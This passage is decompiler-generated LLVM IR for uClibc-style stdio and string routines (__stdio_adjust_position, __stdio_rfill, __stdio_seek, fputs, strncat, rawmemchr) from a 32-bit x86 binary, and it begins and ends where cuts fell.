  store i16 %v1_8066e41, i16* %v3_8066e41, align 2
  %v0_8066e44 = load i32, i32* @esi, align 4
  %v1_8066e44 = add i32 %v0_8066e44, 8
  %v2_8066e44 = inttoptr i32 %v1_8066e44 to i32*
  %v3_8066e44 = load i32, i32* %v2_8066e44, align 4
  store i32 %v3_8066e44, i32* %eax.global-to-local, align 4
  %v2_8066e47 = add i32 %v0_8066e44, 16
  %v3_8066e47 = inttoptr i32 %v2_8066e47 to i32*
  store i32 %v3_8066e44, i32* %v3_8066e47, align 4
  %v0_8066e4a = load i32, i32* %eax.global-to-local, align 4
  %v1_8066e4a = load i32, i32* @esi, align 4
  %v2_8066e4a = add i32 %v1_8066e4a, 20
  %v3_8066e4a = inttoptr i32 %v2_8066e4a to i32*
  store i32 %v0_8066e4a, i32* %v3_8066e4a, align 4
  %v0_8066e4d = load i32, i32* %eax.global-to-local, align 4
  %v1_8066e4d = load i32, i32* @esi, align 4
  %v2_8066e4d = add i32 %v1_8066e4d, 24
  %v3_8066e4d = inttoptr i32 %v2_8066e4d to i32*
  store i32 %v0_8066e4d, i32* %v3_8066e4d, align 4
  %v0_8066e50 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066e50 = load i32, i32* @esi, align 4
  %v2_8066e50 = add i32 %v1_8066e50, 28
  %v3_8066e50 = inttoptr i32 %v2_8066e50 to i32*
  store i32 %v0_8066e50, i32* %v3_8066e50, align 4
  br label %dec_label_pc_8066e58

dec_label_pc_8066e55:                             ; preds = %dec_label_pc_8066e1b, %dec_label_pc_8066e07, %dec_label_pc_8066df2
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_8066e58

dec_label_pc_8066e58:                             ; preds = %dec_label_pc_8066e2f, %dec_label_pc_8066e55
  br i1 %v1_8066dcc, label %dec_label_pc_8066e6d, label %dec_label_pc_8066e5c

dec_label_pc_8066e5c:                             ; preds = %dec_label_pc_8066e58
  %v2_8066e60 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8066e60, i32* %eax.global-to-local, align 4
  %v4_8066e65 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-44, i32 1)
  store i32 %v4_8066e65, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066e6d

dec_label_pc_8066e6d:                             ; preds = %dec_label_pc_8066e58, %dec_label_pc_8066db4, %dec_label_pc_8066e5c
  %v0_8066e70 = load i32, i32* @ebx, align 4
  store i32 %v0_8066e70, i32* %eax.global-to-local, align 4
  store i32 %v0_8066d93, i32* @ebx, align 4
  store i32 %v0_8066d92, i32* @esi, align 4
  store i32 %v0_8066d91, i32* @edi, align 4
  store i32 %v0_8066d90, i32* @ebp, align 4
  ret i32 %v0_8066e70

; uselistorder directives
  uselistorder i32 %v2_8066e1d.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8066e02, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 8, 2, 1, 7, 6, 5, 4, 0 }
  uselistorder i8 64, { 4, 0, 1, 5, 2, 3, 6 }
  uselistorder i32 22, { 10, 7, 13, 6, 16, 8, 11, 12, 9, 17, 0, 14, 1, 2, 3, 4, 15, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8066e6d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066e58, { 1, 0 }
  uselistorder label %dec_label_pc_8066e1b, { 1, 0 }
  uselistorder label %dec_label_pc_8066ded, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_8066e80 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8066e80, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8066e88 = load i16, i16* %arg1, align 2
  %v3_8066e88 = zext i16 %v2_8066e88 to i32
  store i32 %v3_8066e88, i32* @ecx, align 4
  %tmp = urem i16 %v2_8066e88, 4
  %v1_8066e8d = zext i16 %tmp to i32
  %v2_8066e8d = icmp eq i16 %tmp, 0
  br i1 %v2_8066e8d, label %dec_label_pc_8066ebc, label %dec_label_pc_8066e92

dec_label_pc_8066e92:                             ; preds = %entry
  %v1_8066e94 = add nsw i32 %v1_8066e8d, -1
  %v8_8066e94 = icmp eq i32 %v1_8066e94, 0
  store i32 %v1_8066e94, i32* @edx, align 4
  br i1 %v8_8066e94, label %dec_label_pc_8066ebc, label %dec_label_pc_8066e97

dec_label_pc_8066e97:                             ; preds = %dec_label_pc_8066e92
  %v3_8066e97 = and i32 %v3_8066e88, 2048
  %v4_8066e97 = icmp eq i32 %v3_8066e97, 0
  br i1 %v4_8066e97, label %dec_label_pc_8066ebc, label %dec_label_pc_8066e9c

dec_label_pc_8066e9c:                             ; preds = %dec_label_pc_8066e97
  %v6_8066e9c = sub nsw i32 1, %v1_8066e8d
  %v7_8066e9c = and i32 %v1_8066e94, %v6_8066e9c
  %v8_8066e9c = icmp slt i32 %v7_8066e9c, 0
  %v9_8066e9c = icmp eq i16 %tmp, 2
  %v10_8066e9c = icmp ult i16 %tmp, 2
  %v3_8066e9f = icmp eq i1 %v10_8066e9c, %v8_8066e9c
  %v4_8066e9f = icmp eq i1 %v9_8066e9c, false
  %v5_8066e9f = and i1 %v4_8066e9f, %v3_8066e9f
  br i1 %v5_8066e9f, label %dec_label_pc_8066f10, label %dec_label_pc_8066ea1

dec_label_pc_8066ea1:                             ; preds = %dec_label_pc_8066e9c
  %v1_8066ea1 = add i32 %v4_8066e80, 40
  %v2_8066ea1 = inttoptr i32 %v1_8066ea1 to i32*
  %v3_8066ea1 = load i32, i32* %v2_8066ea1, align 4
  %v4_8066ea1 = icmp eq i32 %v3_8066ea1, 0
  %v1_8066ea5 = icmp eq i1 %v4_8066ea1, false
  br i1 %v1_8066ea5, label %dec_label_pc_8066f10, label %dec_label_pc_8066ea7

dec_label_pc_8066ea7:                             ; preds = %dec_label_pc_8066ea1
  %v1_8066ea7 = add i32 %v4_8066e80, 3
  %v2_8066ea7 = inttoptr i32 %v1_8066ea7 to i8*
  %v3_8066ea7 = load i8, i8* %v2_8066ea7, align 1
  %v4_8066ea7 = zext i8 %v3_8066ea7 to i32
  %v2_8066eab = sub nsw i32 %v1_8066e94, %v4_8066ea7
  %v1_8066ead = add i32 %v4_8066e80, 44
  %v2_8066ead = inttoptr i32 %v1_8066ead to i32*
  %v3_8066ead = load i32, i32* %v2_8066ead, align 4
  %v1_8066eb1 = add nsw i32 %v2_8066eab, -1
  %tmp11 = icmp slt i32 %v3_8066ead, 1
  br i1 %tmp11, label %dec_label_pc_8066ebc, label %dec_label_pc_8066eb6

dec_label_pc_8066eb6:                             ; preds = %dec_label_pc_8066ea7
  %v1_8066eb6 = add i32 %v4_8066e80, 2
  %v2_8066eb6 = inttoptr i32 %v1_8066eb6 to i8*
  %v3_8066eb6 = load i8, i8* %v2_8066eb6, align 1
  %v4_8066eb6 = zext i8 %v3_8066eb6 to i32
  %v2_8066eba = sub nsw i32 %v1_8066eb1, %v4_8066eb6
  br label %dec_label_pc_8066ebc

dec_label_pc_8066ebc:                             ; preds = %dec_label_pc_8066ea7, %dec_label_pc_8066e97, %dec_label_pc_8066e92, %entry, %dec_label_pc_8066eb6
  %v0_8066ed1 = phi i32 [ %v1_8066eb1, %dec_label_pc_8066ea7 ], [ %v1_8066e94, %dec_label_pc_8066e97 ], [ 0, %dec_label_pc_8066e92 ], [ 0, %entry ], [ %v2_8066eba, %dec_label_pc_8066eb6 ]
  %v2_8066ebc = and i32 %v3_8066e88, 64
  %v3_8066ebc = icmp eq i32 %v2_8066ebc, 0
  %storemerge.in.in.v = select i1 %v3_8066ebc, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_8066e80
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8066ec9 = add i32 %v4_8066e80, 16
  %v3_8066ec9 = inttoptr i32 %v2_8066ec9 to i32*
  %v4_8066ec9 = load i32, i32* %v3_8066ec9, align 4
  %v5_8066ec9 = sub i32 %storemerge, %v4_8066ec9
  %v1_8066ecc = inttoptr i32 %arg2 to i32*
  %v2_8066ecc = load i32, i32* %v1_8066ecc, align 4
  store i32 %v2_8066ecc, i32* @ecx, align 4
  %v1_8066ece = add i32 %arg2, 4
  %v2_8066ece = inttoptr i32 %v1_8066ece to i32*
  %v3_8066ece = load i32, i32* %v2_8066ece, align 4
  store i32 %v3_8066ece, i32* %ebx.global-to-local, align 4
  %v2_8066ed1 = add i32 %v5_8066ec9, %v0_8066ed1
  store i32 %v2_8066ed1, i32* %esi.global-to-local, align 4
  %v5_8066ee5 = sub i32 %v2_8066ecc, %v2_8066ed1
  %v10_8066ee5 = icmp ult i32 %v2_8066ecc, %v2_8066ed1
  %v6_8066ee9 = zext i1 %v10_8066ee5 to i32
  %tmp13 = icmp slt i32 %v2_8066ed1, 0
  %v2_8066ed6.neg = zext i1 %tmp13 to i32
  %v7_8066ee9 = add i32 %v3_8066ece, %v2_8066ed6.neg
  %v8_8066ee9 = add i32 %v7_8066ee9, %v6_8066ee9
  store i32 %v8_8066ee9, i32* @edx, align 4
  store i32 %v5_8066ee5, i32* %v1_8066ecc, align 4
  %v0_8066eef = load i32, i32* @edx, align 4
  %v1_8066eef = load i32, i32* %edi.global-to-local, align 4
  %v2_8066eef = add i32 %v1_8066eef, 4
  %v3_8066eef = inttoptr i32 %v2_8066eef to i32*
  store i32 %v0_8066eef, i32* %v3_8066eef, align 4
  %v0_8066ef2 = load i32, i32* %edi.global-to-local, align 4
  %v1_8066ef2 = add i32 %v0_8066ef2, 4
  %v2_8066ef2 = inttoptr i32 %v1_8066ef2 to i32*
  %v3_8066ef2 = load i32, i32* %v2_8066ef2, align 4
  %v4_8066ef2 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8066ef5 = icmp slt i32 %v3_8066ef2, %v4_8066ef2
  br i1 %v5_8066ef5, label %dec_label_pc_8066eff, label %dec_label_pc_8066ef7

dec_label_pc_8066ef7:                             ; preds = %dec_label_pc_8066ebc
  %v8_8066ef7 = icmp sgt i32 %v3_8066ef2, %v4_8066ef2
  br i1 %v8_8066ef7, label %dec_label_pc_8066efd, label %dec_label_pc_8066ef9

dec_label_pc_8066ef9:                             ; preds = %dec_label_pc_8066ef7
  %v1_8066ef9 = inttoptr i32 %v0_8066ef2 to i32*
  %v2_8066ef9 = load i32, i32* %v1_8066ef9, align 4
  %v3_8066ef9 = load i32, i32* @ecx, align 4
  %tmp14 = icmp ugt i32 %v2_8066ef9, %v3_8066ef9
  br i1 %tmp14, label %dec_label_pc_8066efd, label %dec_label_pc_8066eff

dec_label_pc_8066efd:                             ; preds = %dec_label_pc_8066ef9, %dec_label_pc_8066ef7
  %v0_8066efd = load i32, i32* %esi.global-to-local, align 4
  %v1_8066efd = sub i32 0, %v0_8066efd
  store i32 %v1_8066efd, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066eff

dec_label_pc_8066eff:                             ; preds = %dec_label_pc_8066ef9, %dec_label_pc_8066ebc, %dec_label_pc_8066efd
  %v0_8066eff = load i32, i32* %esi.global-to-local, align 4
  %v2_8066eff = icmp slt i32 %v0_8066eff, 0
  %v1_8066f01 = icmp eq i1 %v2_8066eff, false
  br i1 %v1_8066f01, label %dec_label_pc_8066f13, label %dec_label_pc_8066f03

dec_label_pc_8066f03:                             ; preds = %dec_label_pc_8066eff
  %v1_8066f03 = call i32 @__errno_location(i32 %v2_8066ed1)
  %v1_8066f08 = inttoptr i32 %v1_8066f03 to i32*
  store i32 75, i32* %v1_8066f08, align 4
  %v0_8066f16.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066f13

dec_label_pc_8066f10:                             ; preds = %dec_label_pc_8066ea1, %dec_label_pc_8066e9c
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066f13

dec_label_pc_8066f13:                             ; preds = %dec_label_pc_8066eff, %dec_label_pc_8066f03, %dec_label_pc_8066f10
  %v0_8066f16 = phi i32 [ %v0_8066eff, %dec_label_pc_8066eff ], [ %v0_8066f16.pre, %dec_label_pc_8066f03 ], [ -1, %dec_label_pc_8066f10 ]
  ret i32 %v0_8066f16

; uselistorder directives
  uselistorder i32 %v4_8066ef2, { 1, 0 }
  uselistorder i32 %v3_8066ef2, { 1, 0 }
  uselistorder i32 %v2_8066ed1, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_8066e94, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_8066e80, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8066f13, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8066eff, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066ebc, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8066f1c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8066f24 = add i32 %arg1, 8
  %v2_8066f24 = inttoptr i32 %v1_8066f24 to i32*
  %v3_8066f24 = load i32, i32* %v2_8066f24, align 4
  store i32 %v3_8066f24, i32* %edx.global-to-local, align 4
  %v1_8066f27 = add i32 %arg1, 12
  %v2_8066f27 = inttoptr i32 %v1_8066f27 to i32*
  %v3_8066f27 = load i32, i32* %v2_8066f27, align 4
  %v2_8066f2a = sub i32 %v3_8066f27, %v3_8066f24
  %v3_8066f2f = inttoptr i32 %arg1 to i16*
  %v4_8066f2f = call i32 @__stdio_READ(i16* %v3_8066f2f, i32 %v3_8066f24, i32 %v2_8066f2a)
  %v0_8066f34 = load i32, i32* @ebx, align 4
  %v1_8066f34 = add i32 %v0_8066f34, 8
  %v2_8066f34 = inttoptr i32 %v1_8066f34 to i32*
  %v3_8066f34 = load i32, i32* %v2_8066f34, align 4
  store i32 %v3_8066f34, i32* %edx.global-to-local, align 4
  %v2_8066f37 = add i32 %v0_8066f34, 16
  %v3_8066f37 = inttoptr i32 %v2_8066f37 to i32*
  store i32 %v3_8066f34, i32* %v3_8066f37, align 4
  %v0_8066f3a = load i32, i32* %edx.global-to-local, align 4
  %v2_8066f3a = add i32 %v0_8066f3a, %v4_8066f2f
  store i32 %v2_8066f3a, i32* %edx.global-to-local, align 4
  %v1_8066f3c = load i32, i32* @ebx, align 4
  %v2_8066f3c = add i32 %v1_8066f3c, 20
  %v3_8066f3c = inttoptr i32 %v2_8066f3c to i32*
  store i32 %v2_8066f3a, i32* %v3_8066f3c, align 4
  store i32 %v0_8066f1c, i32* @ebx, align 4
  ret i32 %v4_8066f2f

; uselistorder directives
  uselistorder i32 %v4_8066f2f, { 1, 0 }
  uselistorder i32 (i16*, i32, i32)* @__stdio_READ, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8066f50 = add i32 %tmp5, 4
  %v2_8066f50 = inttoptr i32 %v1_8066f50 to i32*
  %v3_8066f50 = load i32, i32* %v2_8066f50, align 4
  %v2_8066f53 = load i32, i32* %arg2, align 4
  %v1_8066f59 = add i32 %arg1, 4
  %v2_8066f59 = inttoptr i32 %v1_8066f59 to i32*
  %v3_8066f59 = load i32, i32* %v2_8066f59, align 4
  %v4_8066f5c = call i32 @__libc_lseek64(i32 %v3_8066f59, i32 %v2_8066f53, i32 %v3_8066f50, i32 %arg3)
  %v0_8066f64 = load i32, i32* @edx, align 4
  %v2_8066f64 = icmp slt i32 %v0_8066f64, 0
  store i32 %v4_8066f5c, i32* %ecx.global-to-local, align 4
  br i1 %v2_8066f64, label %dec_label_pc_8066f71, label %dec_label_pc_8066f6a

dec_label_pc_8066f6a:                             ; preds = %entry
  %v1_8066f6a = load i32, i32* @ebx, align 4
  %v2_8066f6a = inttoptr i32 %v1_8066f6a to i32*
  store i32 %v4_8066f5c, i32* %v2_8066f6a, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8066f6e = load i32, i32* @edx, align 4
  %v1_8066f6e = load i32, i32* @ebx, align 4
  %v2_8066f6e = add i32 %v1_8066f6e, 4
  %v3_8066f6e = inttoptr i32 %v2_8066f6e to i32*
  store i32 %v0_8066f6e, i32* %v3_8066f6e, align 4
  %v0_8066f72.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8066f71

dec_label_pc_8066f71:                             ; preds = %entry, %dec_label_pc_8066f6a
  %v0_8066f72 = phi i32 [ %v4_8066f5c, %entry ], [ %v0_8066f72.pre, %dec_label_pc_8066f6a ]
  ret i32 %v0_8066f72

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8066f71, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8066f78 = load i32, i32* @edi, align 4
  %v0_8066f79 = load i32, i32* @esi, align 4
  %v0_8066f7a = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v1_8066f82 = add i32 %arg2, 52
  %v2_8066f82 = inttoptr i32 %v1_8066f82 to i32*
  %v3_8066f82 = load i32, i32* %v2_8066f82, align 4
  store i32 %v3_8066f82, i32* @edi, align 4
  %v1_8066f85 = icmp eq i32 %v3_8066f82, 0
  %v1_8066f87 = icmp eq i1 %v1_8066f85, false
  br i1 %v1_8066f87, label %entry.dec_label_pc_8066fa8_crit_edge, label %dec_label_pc_8066f89

entry.dec_label_pc_8066fa8_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8066fa8

dec_label_pc_8066f89:                             ; preds = %entry
  %v1_8066f89 = add i32 %arg2, 56
  store i32 %v1_8066f89, i32* @ebx, align 4
  %v4_8066f98 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134586897, i32 %v1_8066f89)
  %v0_8066f9d = load i32, i32* @ebx, align 4
  %v1_8066fa0 = call i32 @pthread_mutex_lock(i32 %v0_8066f9d)
  %v0_8066faa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8066fa8

dec_label_pc_8066fa8:                             ; preds = %entry.dec_label_pc_8066fa8_crit_edge, %dec_label_pc_8066f89
  %v0_8066faa = phi i32 [ %arg2, %entry.dec_label_pc_8066fa8_crit_edge ], [ %v0_8066faa.pre, %dec_label_pc_8066f89 ]
  %v0_8066fa8 = load i32, i32* @edx, align 4
  %v4_8066faf = inttoptr i32 %arg1 to i8*
  %v5_8066faf = call i32 @__GI_fputs_unlocked(i8* %v4_8066faf, i32 %v0_8066faa, i32 %v0_8066fa8, i32 %v0_8066fa8)
  store i32 %v5_8066faf, i32* @ebx, align 4
  br i1 %v1_8066f87, label %dec_label_pc_8066fce, label %dec_label_pc_8066fbd

dec_label_pc_8066fbd:                             ; preds = %dec_label_pc_8066fa8
  %v3_8066fc6 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_8066fd1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8066fce

dec_label_pc_8066fce:                             ; preds = %dec_label_pc_8066fa8, %dec_label_pc_8066fbd
  %v0_8066fd1 = phi i32 [ %v5_8066faf, %dec_label_pc_8066fa8 ], [ %v0_8066fd1.pre, %dec_label_pc_8066fbd ]
  store i32 %v0_8066f7a, i32* @ebx, align 4
  store i32 %v0_8066f79, i32* @esi, align 4
  store i32 %v0_8066f78, i32* @edi, align 4
  ret i32 %v0_8066fd1

; uselistorder directives
  uselistorder i32 (i32*, i32)* @__pthread_cleanup_pop_restore, { 23, 25, 31, 4, 5, 6, 7, 8, 9, 24, 29, 21, 22, 30, 27, 28, 10, 11, 12, 13, 14, 15, 3, 26, 16, 17, 2, 18, 19, 20, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_fputs_unlocked, { 1, 2, 0 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 13, 11, 36, 35, 34, 33, 32, 31, 30, 12, 5, 18, 17, 4, 0, 1, 2, 3, 29, 28, 27, 26, 25, 24, 37, 10, 23, 22, 38, 21, 20, 19, 40, 39, 9, 6, 16, 8, 7, 15, 14 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 24, 26, 4, 5, 6, 7, 8, 9, 10, 25, 28, 22, 23, 31, 30, 29, 11, 12, 13, 14, 15, 16, 3, 27, 17, 18, 2, 19, 20, 21, 0, 1 }
  uselistorder i32 134586897, { 2, 3, 4, 29, 33, 34, 35, 36, 37, 0, 5, 6, 7, 8, 9, 10, 11, 12, 1, 23, 24, 25, 13, 14, 15, 16, 17, 26, 30, 27, 31, 18, 28, 19, 20, 21, 22, 32 }
  uselistorder i32 52, { 11, 12, 0, 8, 1, 2, 3, 5, 4, 16, 17, 7, 13, 14, 15, 9, 6, 10 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8066fce, { 1, 0 }
  uselistorder label %dec_label_pc_8066fa8, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8066fdb = load i32, i32* @esi, align 4
  store i32 %v0_8066fdb, i32* %stack_var_-8, align 4
  %v4_8066fdf = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8066fdf, i32* %esi.global-to-local, align 4
  %v4_8066fe7 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8066feb = call i32 @_strlen(i8* %v4_8066fe7)
  %v2_8066fed = add i32 %tmp, -1
  store i32 %v2_8066fed, i32* %edi.global-to-local, align 4
  %v8_8066ff110 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* @ecx, align 4
  br i1 %v8_8066ff110, label %dec_label_pc_8066ffc, label %dec_label_pc_8066ff4.lr.ph

dec_label_pc_8066ff4.lr.ph:                       ; preds = %entry
  %v4_8066ff4.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8066ff4.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8066ff4

dec_label_pc_8066ff4:                             ; preds = %dec_label_pc_8066ff4.lr.ph, %dec_label_pc_8066ff4.dec_label_pc_8066ff1_crit_edge
  %v8_8066ff4 = phi i1 [ %v8_8066ff4.pre, %dec_label_pc_8066ff4.lr.ph ], [ %v5_8066ff5, %dec_label_pc_8066ff4.dec_label_pc_8066ff1_crit_edge ]
  %v4_8066ff4 = phi i32 [ %v4_8066ff4.pre, %dec_label_pc_8066ff4.lr.ph ], [ %v0_8066ff6, %dec_label_pc_8066ff4.dec_label_pc_8066ff1_crit_edge ]
  %v2_8066ffe12 = phi i32 [ %v2_8066fed, %dec_label_pc_8066ff4.lr.ph ], [ %v7_8066ff5, %dec_label_pc_8066ff4.dec_label_pc_8066ff1_crit_edge ]
  %v0_8066ff4 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066ff4 = inttoptr i32 %v0_8066ff4 to i8*
  %v2_8066ff4 = load i8, i8* %v1_8066ff4, align 1
  %v3_8066ff4 = zext i8 %v2_8066ff4 to i32
  %v5_8066ff4 = and i32 %v4_8066ff4, -256
  %v6_8066ff4 = or i32 %v5_8066ff4, %v3_8066ff4
  store i32 %v6_8066ff4, i32* %eax.global-to-local, align 4
  %v9_8066ff4 = select i1 %v8_8066ff4, i32 -1, i32 1
  %v10_8066ff4 = add i32 %v9_8066ff4, %v0_8066ff4
  store i32 %v10_8066ff4, i32* %esi.global-to-local, align 4
  %v3_8066ff5 = inttoptr i32 %v2_8066ffe12 to i8*
  store i8 %v2_8066ff4, i8* %v3_8066ff5, align 1
  %v4_8066ff5 = load i32, i32* %edi.global-to-local, align 4
  %v5_8066ff5 = load i1, i1* @df, align 1
  %v6_8066ff5 = select i1 %v5_8066ff5, i32 -1, i32 1
  %v7_8066ff5 = add i32 %v6_8066ff5, %v4_8066ff5
  store i32 %v7_8066ff5, i32* %edi.global-to-local, align 4
  %v0_8066ff6 = load i32, i32* %eax.global-to-local, align 4
  %v3_8066ff6 = trunc i32 %v0_8066ff6 to i8
  %v4_8066ff6 = icmp eq i8 %v3_8066ff6, 0
  %v1_8066ff8 = icmp eq i1 %v4_8066ff6, false
  br i1 %v1_8066ff8, label %dec_label_pc_8066ff4.dec_label_pc_8066ff1_crit_edge, label %dec_label_pc_8066fff

dec_label_pc_8066ff4.dec_label_pc_8066ff1_crit_edge: ; preds = %dec_label_pc_8066ff4
  %v0_8066ff1.pre = load i32, i32* @ecx, align 4
  %v1_8066ff1 = add i32 %v0_8066ff1.pre, -1
  %v8_8066ff1 = icmp eq i32 %v1_8066ff1, 0
  store i32 %v1_8066ff1, i32* @ecx, align 4
  br i1 %v8_8066ff1, label %dec_label_pc_8066ffc, label %dec_label_pc_8066ff4

dec_label_pc_8066ffc:                             ; preds = %dec_label_pc_8066ff4.dec_label_pc_8066ff1_crit_edge, %entry
  %v2_8066ffe.lcssa = phi i32 [ %v2_8066fed, %entry ], [ %v7_8066ff5, %dec_label_pc_8066ff4.dec_label_pc_8066ff1_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8066ffe = inttoptr i32 %v2_8066ffe.lcssa to i8*
  store i8 0, i8* %v3_8066ffe, align 1
  %v4_8066ffe = load i32, i32* %edi.global-to-local, align 4
  %v5_8066ffe = load i1, i1* @df, align 1
  %v6_8066ffe = select i1 %v5_8066ffe, i32 -1, i32 1
  %v7_8066ffe = add i32 %v6_8066ffe, %v4_8066ffe
  store i32 %v7_8066ffe, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8066fff

dec_label_pc_8066fff:                             ; preds = %dec_label_pc_8066ff4, %dec_label_pc_8066ffc
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8067003 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8067003, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8066ff1, { 1, 0 }
  uselistorder i32 %v0_8066ff6, { 1, 0 }
  uselistorder i32 %v7_8066ff5, { 0, 2, 1 }
  uselistorder i1 %v5_8066ff5, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* @df, { 9, 10, 0, 11, 12, 13, 14, 1, 2, 3, 16, 17, 4, 5, 6, 7, 8, 15 }
  uselistorder label %dec_label_pc_8066fff, { 1, 0 }
  uselistorder label %dec_label_pc_8066ff4, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80672d1 = load i32, i32* @ebx, align 4
  %v4_80672d2 = urem i32 %arg2, 256
  %v4_80672d6 = ptrtoint i8* %arg1 to i32
  %v2_80672e13 = urem i32 %v4_80672d6, 4
  %v3_80672e14 = icmp eq i32 %v2_80672e13, 0
  %v1_80672e38 = icmp eq i1 %v3_80672e14, false
  %v4_80672dc = trunc i32 %arg2 to i8
  br i1 %v1_80672e38, label %dec_label_pc_80672dc, label %dec_label_pc_80672e5

dec_label_pc_80672dc:                             ; preds = %entry, %dec_label_pc_80672e0
  %v0_80672e0 = phi i32 [ %v1_80672e0, %dec_label_pc_80672e0 ], [ %v4_80672d6, %entry ]
  %v1_80672dc = inttoptr i32 %v0_80672e0 to i8*
  %v2_80672dc = load i8, i8* %v1_80672dc, align 1
  %v15_80672dc = icmp eq i8 %v2_80672dc, %v4_80672dc
  br i1 %v15_80672dc, label %dec_label_pc_8067330, label %dec_label_pc_80672e0

dec_label_pc_80672e0:                             ; preds = %dec_label_pc_80672dc
  %v1_80672e0 = add i32 %v0_80672e0, 1
  %v2_80672e1 = urem i32 %v1_80672e0, 4
  %v3_80672e1 = icmp eq i32 %v2_80672e1, 0
  %v1_80672e3 = icmp eq i1 %v3_80672e1, false
  br i1 %v1_80672e3, label %dec_label_pc_80672dc, label %dec_label_pc_80672e5

dec_label_pc_80672e5:                             ; preds = %entry, %dec_label_pc_80672e0
  %v0_80672e8 = phi i32 [ %v1_80672e0, %dec_label_pc_80672e0 ], [ %v4_80672d6, %entry ]
  %v2_80672ec = mul nuw nsw i32 %v4_80672d2, 256
  %v2_80672ef = or i32 %v2_80672ec, %v4_80672d2
  %v2_80672f3 = mul i32 %v2_80672ef, 65536
  %v2_80672f6 = or i32 %v2_80672f3, %v2_80672ef
  br label %dec_label_pc_80672f8

